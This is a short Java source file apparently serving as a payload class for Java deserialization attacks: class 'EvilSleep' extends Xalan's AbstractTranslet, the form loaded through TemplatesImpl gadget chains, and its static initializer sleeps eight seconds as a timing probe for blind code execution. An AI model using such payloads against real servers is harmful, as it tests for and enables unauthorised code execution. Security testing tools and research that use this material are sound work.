import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class EvilSleep extends AbstractTranslet {
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {
    }
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {
    }
    static {
        try { Thread.sleep(8000); } catch (Exception e) { }
    }
}
